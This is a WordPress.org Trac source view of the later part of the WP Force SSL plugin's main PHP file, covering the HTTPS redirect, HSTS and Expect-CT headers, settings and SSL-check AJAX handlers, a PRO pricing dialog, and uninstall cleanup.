| [862](#L862) | echo '<h2>Generate Free SSL Certificate<span class="pro-feature">PRO</span></h2>'; |
| [863](#L863) | echo '<div id="wfssl\_cert\_generate" class="wfssl-box">'; |
| [864](#L864) | echo '<p>Use this <a href="#" data-pro-feature="generate-ssl-cert-text" class="open-pro-dialog">PRO</a> tool to generate a free Let\'s Encrypt certificate. The certificate will be renewed automatically as long as WP Force SSL is active on the website. All you need is an email address, no other personal information or payment is necessary.</p>'; |
| [865](#L865) | echo '<div class="button button-primary open-pro-dialog" data-pro-feature="generate-ssl-cert">Generate Free SSL Certificate</div>'; |
| [866](#L866) | echo '</div>'; |
| [867](#L867) | } // tab\_ssl |
| [868](#L868) |  |
| [869](#L869) |  |
| [870](#L870) | /\*\* |
| [871](#L871) | \* Perform the redirect to HTTPS if loaded over HTTP |
| [872](#L872) | \* |
| [873](#L873) | \* @since 1.5 |
| [874](#L874) | \* |
| [875](#L875) | \* @return null |
| [876](#L876) | \* |
| [877](#L877) | \*/ |
| [878](#L878) | public function wpfs\_core() |
| [879](#L879) | { |
| [880](#L880) | if (!is\_ssl()) { |
| [881](#L881) | wp\_safe\_redirect('https://' . $\_SERVER['HTTP\_HOST'] . $\_SERVER['REQUEST\_URI'], 301); |
| [882](#L882) | exit(); |
| [883](#L883) | } |
| [884](#L884) | } // wpfs\_core |
| [885](#L885) |  |
| [886](#L886) |  |
| [887](#L887) | /\*\* |
| [888](#L888) | \* Check if minimal WP version required by WP Force SSL is used |
| [889](#L889) | \* |
| [890](#L890) | \* @since 1.5 |
| [891](#L891) | \* |
| [892](#L892) | \* @return bool |
| [893](#L893) | \* |
| [894](#L894) | \*/ |
| [895](#L895) | public function check\_wp\_version($min\_version) |
| [896](#L896) | { |
| [897](#L897) | if (!version\_compare(get\_bloginfo('version'), $min\_version,  '>=')) { |
| [898](#L898) | add\_action('admin\_notices', array($this, 'notice\_min\_wp\_version')); |
| [899](#L899) | return false; |
| [900](#L900) | } else { |
| [901](#L901) | return true; |
| [902](#L902) | } |
| [903](#L903) | } // check\_wp\_version |
| [904](#L904) |  |
| [905](#L905) |  |
| [906](#L906) | /\*\* |
| [907](#L907) | \* Display error message if WP version is too low |
| [908](#L908) | \* |
| [909](#L909) | \* @since 1.5 |
| [910](#L910) | \* |
| [911](#L911) | \* @return null |
| [912](#L912) | \* |
| [913](#L913) | \*/ |
| [914](#L914) | public function notice\_min\_wp\_version() |
| [915](#L915) | { |
| [916](#L916) | echo '<div class="error"><p>' . sprintf(\_\_('WP Force SSL plugin <b>requires WordPress version 4.6</b> or higher to function properly. You are using WordPress version %s. Please <a href="%s">update it</a>.', 'wp-force-ssl'), get\_bloginfo('version'), admin\_url('update-core.php')) . '</p></div>'; |
| [917](#L917) | } // notice\_min\_wp\_version\_error |
| [918](#L918) |  |
| [919](#L919) |  |
| [920](#L920) | /\*\* |
| [921](#L921) | \* Send the HTTP Strict Transport Security (HSTS) header. |
| [922](#L922) | \* |
| [923](#L923) | \* @since 1.5 |
| [924](#L924) | \* |
| [925](#L925) | \* @return null |
| [926](#L926) | \*/ |
| [927](#L927) | public function to\_strict\_transport\_security() |
| [928](#L928) | { |
| [929](#L929) | header('Strict-Transport-Security: max-age=31536000; includeSubDomains; preload'); |
| [930](#L930) | } // to\_strict\_transport\_security |
| [931](#L931) |  |
| [932](#L932) |  |
| [933](#L933) | /\*\* |
| [934](#L934) | \* Send the Expect CT header. |
| [935](#L935) | \* |
| [936](#L936) | \* @since 1.5 |
| [937](#L937) | \* |
| [938](#L938) | \* @return null |
| [939](#L939) | \*/ |
| [940](#L940) | public function enable\_expect\_ct() |
| [941](#L941) | { |
| [942](#L942) | header('Expect-CT: max-age=5184000, enforce'); |
| [943](#L943) | } // enable\_expect\_ct |
| [944](#L944) |  |
| [945](#L945) |  |
| [946](#L946) | /\*\* |
| [947](#L947) | \* Save plugin settings received via AJAX |
| [948](#L948) | \* |
| [949](#L949) | \* @since 1.5 |
| [950](#L950) | \* |
| [951](#L951) | \* @return null |
| [952](#L952) | \*/ |
| [953](#L953) | public function ajax\_save\_setting() |
| [954](#L954) | { |
| [955](#L955) | check\_ajax\_referer('save\_settting\_nonce\_action'); |
| [956](#L956) |  |
| [957](#L957) | $wpfs\_ssl = isset($\_POST['wpfs\_ssl']) ? 'yes' : 'no'; |
| [958](#L958) | $wpfs\_hsts = isset($\_POST['wpfs\_hsts']) ? 'yes' : 'no'; |
| [959](#L959) | $wpfs\_expect\_ct = isset($\_POST['wpfs\_expect\_ct']) ? 'yes' : 'no'; |
| [960](#L960) | $wpfs\_adminbar\_menu = isset($\_POST['wpfs\_adminbar\_menu']) ? 'yes' : 'no'; |
| [961](#L961) | $wpfs\_dashboard\_widget = isset($\_POST['wpfs\_dashboard\_widget']) ? 'yes' : 'no'; |
| [962](#L962) |  |
| [963](#L963) | $wpfs\_settings = array( |
| [964](#L964) | 'wpfs\_ssl' => $wpfs\_ssl, |
| [965](#L965) | 'wpfs\_hsts' => $wpfs\_hsts, |
| [966](#L966) | 'wpfs\_expect\_ct' => $wpfs\_expect\_ct, |
| [967](#L967) | 'wpfs\_adminbar\_menu' => $wpfs\_adminbar\_menu, |
| [968](#L968) | 'wpfs\_dashboard\_widget' => $wpfs\_dashboard\_widget |
| [969](#L969) | ); |
| [970](#L970) | update\_option(WPFSSL\_OPTIONS\_KEY, $wpfs\_settings); |
| [971](#L971) |  |
| [972](#L972) | wp\_send\_json\_success(); |
| [973](#L973) | } // ajax\_save\_setting |
| [974](#L974) |  |
| [975](#L975) |  |
| [976](#L976) | /\*\* |
| [977](#L977) | \* Check SSL Certificate by performing a request to home\_url over https and send back a json response |
| [978](#L978) | \* |
| [979](#L979) | \* @since 1.5 |
| [980](#L980) | \* |
| [981](#L981) | \* @return null |
| [982](#L982) | \*/ |
| [983](#L983) | public function ajax\_check\_ssl() |
| [984](#L984) | { |
| [985](#L985) | global $wp\_force\_ssl\_tests; |
| [986](#L986) |  |
| [987](#L987) | check\_ajax\_referer('test\_ssl\_nonce\_action'); |
| [988](#L988) |  |
| [989](#L989) | if (isset($\_REQUEST['force']) && (bool)$\_REQUEST['force'] === true) { |
| [990](#L990) | $nocache = true; |
| [991](#L991) | } else { |
| [992](#L992) | $nocache = false; |
| [993](#L993) | } |
| [994](#L994) | $status = $wp\_force\_ssl\_tests->get\_ssl\_status($nocache); |
| [995](#L995) |  |
| [996](#L996) | wp\_send\_json\_success($status); |
| [997](#L997) | } // check\_ssl |
| [998](#L998) |  |
| [999](#L999) | /\*\* |
| [1000](#L1000) | \* Check if currently on WP Force SSL settings page |
| [1001](#L1001) | \* |
| [1002](#L1002) | \* @since 1.5 |
| [1003](#L1003) | \* |
| [1004](#L1004) | \* @return bool is on WP Force SSL settings page |
| [1005](#L1005) | \*/ |
| [1006](#L1006) | public function is\_plugin\_page() |
| [1007](#L1007) | { |
| [1008](#L1008) | $current\_screen = get\_current\_screen(); |
| [1009](#L1009) | if ($current\_screen->id === 'settings\_page\_wpfs-settings') { |
| [1010](#L1010) | return true; |
| [1011](#L1011) | } else { |
| [1012](#L1012) | return false; |
| [1013](#L1013) | } |
| [1014](#L1014) | } // is\_plugin\_page |
| [1015](#L1015) |  |
| [1016](#L1016) |  |
| [1017](#L1017) | /\*\* |
| [1018](#L1018) | \* Change admin footer text to show plugin information |
| [1019](#L1019) | \* |
| [1020](#L1020) | \* @since 1.5 |
| [1021](#L1021) | \* |
| [1022](#L1022) | \* @param string $text\_org original footer text |
| [1023](#L1023) | \* |
| [1024](#L1024) | \* @return string footer text html |
| [1025](#L1025) | \*/ |
| [1026](#L1026) | public function admin\_footer\_text($text\_org) |
| [1027](#L1027) | { |
| [1028](#L1028) | if (false === $this->is\_plugin\_page()) { |
| [1029](#L1029) | return $text\_org; |
| [1030](#L1030) | } |
| [1031](#L1031) |  |
| [1032](#L1032) | $text = '<i><a target="\_blank" href="https://wpforcessl.com/?ref=wpfssl-free">WP Force SSL</a> v' . $this->version . ' by <a href="https://www.webfactoryltd.com/" title="' . \_\_('Visit our site to get more great plugins', 'wp-force-ssl') . '" target="\_blank">WebFactory Ltd</a>.'; |
| [1033](#L1033) | $text .= ' Please <a target="\_blank" href="https://wordpress.org/support/plugin/wp-force-ssl/reviews/#new-post" title="' . \_\_('Rate the plugin', 'wp-force-ssl') . '">' . \_\_('Rate the plugin ★★★★★', 'wp-force-ssl') . '</a>.</i> '; |
| [1034](#L1034) | return $text; |
| [1035](#L1035) | } // admin\_footer\_text |
| [1036](#L1036) |  |
| [1037](#L1037) |  |
| [1038](#L1038) | function pro\_dialog() |
| [1039](#L1039) | { |
| [1040](#L1040) | $out = ''; |
| [1041](#L1041) |  |
| [1042](#L1042) | $out .= '<div id="wpfssl-pro-dialog" style="display: none;" title="WP Force SSL PRO is here!"><span class="ui-helper-hidden-accessible"><input type="text"/></span>'; |
| [1043](#L1043) |  |
| [1044](#L1044) | $out .= '<div class="center logo"><a href="https://wpforcessl.com/?ref=wpfssl-free-pricing-table" target="\_blank"><img src="' . $this->plugin\_url . 'img/wp-force-ssl-logo.png' . '" alt="WP Force SSL PRO" title="WP Force SSL PRO"></a><br>'; |
| [1045](#L1045) |  |
| [1046](#L1046) | $out .= '<span>Limited PRO Launch Discount - <b>all prices are LIFETIME</b>! Pay once &amp; use forever!</span>'; |
| [1047](#L1047) | $out .= '</div>'; |
| [1048](#L1048) |  |
| [1049](#L1049) | $out .= '<table id="wpfssl-pro-table">'; |
| [1050](#L1050) | $out .= '<tr>'; |
| [1051](#L1051) | $out .= '<td class="center">Lifetime Personal License</td>'; |
| [1052](#L1052) | $out .= '<td class="center">Lifetime Team License</td>'; |
| [1053](#L1053) | $out .= '<td class="center">Lifetime Agency License</td>'; |
| [1054](#L1054) | $out .= '</tr>'; |
| [1055](#L1055) |  |
| [1056](#L1056) | $out .= '<tr class="prices">'; |
| [1057](#L1057) | $out .= '<td class="center"><del>$49 /year</del><br><span>$59</span> <b>/lifetime</b></td>'; |
| [1058](#L1058) | $out .= '<td class="center"><del>$89 /year</del><br><span>$89</span> <b>/lifetime</b></td>'; |
| [1059](#L1059) | $out .= '<td class="center"><del>$199 /year</del><br><span>$119</span> <b>/lifetime</b></td>'; |
| [1060](#L1060) | $out .= '</tr>'; |
| [1061](#L1061) |  |
| [1062](#L1062) | $out .= '<tr>'; |
| [1063](#L1063) | $out .= '<td><span class="dashicons dashicons-yes"></span><b>1 Site License</b></td>'; |
| [1064](#L1064) | $out .= '<td><span class="dashicons dashicons-yes"></span><b>5 Sites License</b></td>'; |
| [1065](#L1065) | $out .= '<td><span class="dashicons dashicons-yes"></span><b>100 Sites License</b></td>'; |
| [1066](#L1066) | $out .= '</tr>'; |
| [1067](#L1067) |  |
| [1068](#L1068) | $out .= '<tr>'; |
| [1069](#L1069) | $out .= '<td><span class="dashicons dashicons-yes"></span>All Plugin Features</td>'; |
| [1070](#L1070) | $out .= '<td><span class="dashicons dashicons-yes"></span>All Plugin Features</td>'; |
| [1071](#L1071) | $out .= '<td><span class="dashicons dashicons-yes"></span>All Plugin Features</td>'; |
| [1072](#L1072) | $out .= '</tr>'; |
| [1073](#L1073) |  |
| [1074](#L1074) | $out .= '<tr>'; |
| [1075](#L1075) | $out .= '<td><span class="dashicons dashicons-yes"></span>Lifetime Updates &amp; Support</td>'; |
| [1076](#L1076) | $out .= '<td><span class="dashicons dashicons-yes"></span>Lifetime Updates &amp; Support</td>'; |
| [1077](#L1077) | $out .= '<td><span class="dashicons dashicons-yes"></span>Lifetime Updates &amp; Support</td>'; |
| [1078](#L1078) | $out .= '</tr>'; |
| [1079](#L1079) |  |
| [1080](#L1080) | $out .= '<tr>'; |
| [1081](#L1081) | $out .= '<td><span class="dashicons dashicons-yes"></span>Content Scanner</td>'; |
| [1082](#L1082) | $out .= '<td><span class="dashicons dashicons-yes"></span>Content Scanner</td>'; |
| [1083](#L1083) | $out .= '<td><span class="dashicons dashicons-yes"></span>Content Scanner</td>'; |
| [1084](#L1084) | $out .= '</tr>'; |
| [1085](#L1085) |  |
| [1086](#L1086) | $out .= '<tr>'; |
| [1087](#L1087) | $out .= '<td><span class="dashicons dashicons-yes"></span>Real-Time SSL &amp; Site Monitoring</td>'; |
| [1088](#L1088) | $out .= '<td><span class="dashicons dashicons-yes"></span>Real-Time SSL &amp; Site Monitoring</td>'; |
| [1089](#L1089) | $out .= '<td><span class="dashicons dashicons-yes"></span>Real-Time SSL &amp; Site Monitoring</td>'; |
| [1090](#L1090) | $out .= '</tr>'; |
| [1091](#L1091) |  |
| [1092](#L1092) | $out .= '<tr>'; |
| [1093](#L1093) | $out .= '<td><span class="dashicons dashicons-yes"></span>Free SSL Certificate Generating</td>'; |
| [1094](#L1094) | $out .= '<td><span class="dashicons dashicons-yes"></span>Free SSL Certificate Generating</td>'; |
| [1095](#L1095) | $out .= '<td><span class="dashicons dashicons-yes"></span>Free SSL Certificate Generating</td>'; |
| [1096](#L1096) | $out .= '</tr>'; |
| [1097](#L1097) |  |
| [1098](#L1098) | $out .= '<tr>'; |
| [1099](#L1099) | $out .= '<td><span class="dashicons dashicons-no"></span>Licenses &amp; Sites Manager</td>'; |
| [1100](#L1100) | $out .= '<td><span class="dashicons dashicons-yes"></span>Licenses &amp; Sites Manager</td>'; |
| [1101](#L1101) | $out .= '<td><span class="dashicons dashicons-yes"></span>Licenses &amp; Sites Manager</td>'; |
| [1102](#L1102) | $out .= '</tr>'; |
| [1103](#L1103) |  |
| [1104](#L1104) | $out .= '<tr>'; |
| [1105](#L1105) | $out .= '<td><span class="dashicons dashicons-no"></span>White-label Mode</td>'; |
| [1106](#L1106) | $out .= '<td><span class="dashicons dashicons-yes"></span>White-label Mode</td>'; |
| [1107](#L1107) | $out .= '<td><span class="dashicons dashicons-yes"></span>White-label Mode</td>'; |
| [1108](#L1108) | $out .= '</tr>'; |
| [1109](#L1109) |  |
| [1110](#L1110) | $out .= '<tr>'; |
| [1111](#L1111) | $out .= '<td><span class="dashicons dashicons-no"></span>Full Plugin Rebranding</td>'; |
| [1112](#L1112) | $out .= '<td><span class="dashicons dashicons-no"></span>Full Plugin Rebranding</td>'; |
| [1113](#L1113) | $out .= '<td><span class="dashicons dashicons-yes"></span>Full Plugin Rebranding</td>'; |
| [1114](#L1114) | $out .= '</tr>'; |
| [1115](#L1115) |  |
| [1116](#L1116) | $out .= '<tr>'; |
| [1117](#L1117) | $out .= '<td><a class="button button-buy" data-href-org="https://wpforcessl.com/buy/?product=personal-launch&ref=pricing-table" href="https://wpforcessl.com/buy/?product=personal-launch&ref=pricing-table" target="\_blank">Lifetime License<br>$59 -&gt; BUY NOW</a> |
| [1118](#L1118) | <br>or <a class="button-buy" data-href-org="https://wpforcessl.com/buy/?product=personal-monthly&ref=pricing-table" href="https://wpforcessl.com/buy/?product=personal-monthly&ref=pricing-table" target="\_blank">only $6.99 <small>/month</small></a></td>'; |
| [1119](#L1119) | $out .= '<td><a class="button button-buy" data-href-org="https://wpforcessl.com/buy/?product=team-launch&ref=pricing-table" href="https://wpforcessl.com/buy/?product=team-launch&ref=pricing-table" target="\_blank">Lifetime License<br>$69 -&gt; BUY NOW</a></td>'; |
| [1120](#L1120) | $out .= '<td><a class="button button-buy" data-href-org="https://wpforcessl.com/buy/?product=agency-launch&ref=pricing-table" href="https://wpforcessl.com/buy/?product=agency-launch&ref=pricing-table" target="\_blank">Lifetime License<br>$119 -&gt; BUY NOW</a></td>'; |
| [1121](#L1121) | $out .= '</tr>'; |
| [1122](#L1122) |  |
| [1123](#L1123) | $out .= '</table>'; |
| [1124](#L1124) |  |
| [1125](#L1125) | $out .= '<div class="center footer"><b>100% No-Risk Money Back Guarantee!</b> If you don\'t like the plugin over the next 7 days, we will happily refund 100% of your money. No questions asked! Payments are processed by our merchant of records - <a href="https://paddle.com/" target="\_blank">Paddle</a>.</div></div>'; |
| [1126](#L1126) |  |
| [1127](#L1127) | return $out; |
| [1128](#L1128) | } // pro\_dialog |
| [1129](#L1129) |  |
| [1130](#L1130) |  |
| [1131](#L1131) | /\*\* |
| [1132](#L1132) | \* Clean-up on delete |
| [1133](#L1133) | \* |
| [1134](#L1134) | \* @since 1.5 |
| [1135](#L1135) | \* |
| [1136](#L1136) | \* @return null |
| [1137](#L1137) | \*/ |
| [1138](#L1138) | public static function uninstall() |
| [1139](#L1139) | { |
| [1140](#L1140) | delete\_option(WPFSSL\_OPTIONS\_KEY); |
| [1141](#L1141) | delete\_option(WPFSSL\_META\_KEY); |
| [1142](#L1142) | } // uninstall |
| [1143](#L1143) |  |
| [1144](#L1144) |  |
| [1145](#L1145) | /\*\* |
| [1146](#L1146) | \* Reset on deactivate |
| [1147](#L1147) | \* |
| [1148](#L1148) | \* @return null |
| [1149](#L1149) | \*/ |
| [1150](#L1150) | public static function deactivate() |
| [1151](#L1151) | { |
| [1152](#L1152) | $meta = get\_option(WPFSSL\_META\_KEY, array()); |
| [1153](#L1153) | $meta['hide\_welcome\_pointer'] = false; |
| [1154](#L1154) | update\_option(WPFSSL\_META\_KEY, $meta); |
| [1155](#L1155) | } // deactivate |
| [1156](#L1156) |  |
| [1157](#L1157) |  |
| [1158](#L1158) | /\*\* |
| [1159](#L1159) | \* Disabled; we use singleton pattern so magic functions need to be disabled. |
| [1160](#L1160) | \* |
| [1161](#L1161) | \* @since 1.5 |
| [1162](#L1162) | \* |
| [1163](#L1163) | \* @return null |
| [1164](#L1164) | \*/ |
| [1165](#L1165) | private function \_\_clone() |
| [1166](#L1166) | { |
| [1167](#L1167) | } |
| [1168](#L1168) |  |
| [1169](#L1169) |  |
| [1170](#L1170) | /\*\* |
| [1171](#L1171) | \* Disabled; we use singleton pattern so magic functions need to be disabled. |
| [1172](#L1172) | \* |
| [1173](#L1173) | \* @since 1.5 |
| [1174](#L1174) | \* |
| [1175](#L1175) | \* @return null |
| [1176](#L1176) | \*/ |
| [1177](#L1177) | public function \_\_sleep() |
| [1178](#L1178) | { |
| [1179](#L1179) | } |
| [1180](#L1180) |  |
| [1181](#L1181) |  |
| [1182](#L1182) | /\*\* |
| [1183](#L1183) | \* Disabled; we use singleton pattern so magic functions need to be disabled. |
| [1184](#L1184) | \* |
| [1185](#L1185) | \* @since 1.5 |
| [1186](#L1186) | \* |
| [1187](#L1187) | \* @return null |
| [1188](#L1188) | \*/ |
| [1189](#L1189) | public function \_\_wakeup() |
| [1190](#L1190) | { |
| [1191](#L1191) | } |
| [1192](#L1192) | // end class |
| [1193](#L1193) | } |
| [1194](#L1194) |  |
| [1195](#L1195) |  |
| [1196](#L1196) | $wpfs = wpForceSSL::get\_instance(); |
| [1197](#L1197) | add\_action('plugins\_loaded', array($wpfs, 'plugins\_loaded')); |
| [1198](#L1198) | register\_deactivation\_hook(\_\_FILE\_\_, array('wpForceSSL', 'deactivate')); |
| [1199](#L1199) | register\_uninstall\_hook(\_\_FILE\_\_, array('wpForceSSL', 'uninstall')); |

**Note:** See [TracBrowser](/wiki/TracBrowser)
for help on using the repository browser.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Plain Text](/browser/wp-force-ssl/tags/1.66/wp-force-ssl.php?format=txt)
* [Original Format](/export/3220773/wp-force-ssl/tags/1.66/wp-force-ssl.php)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)


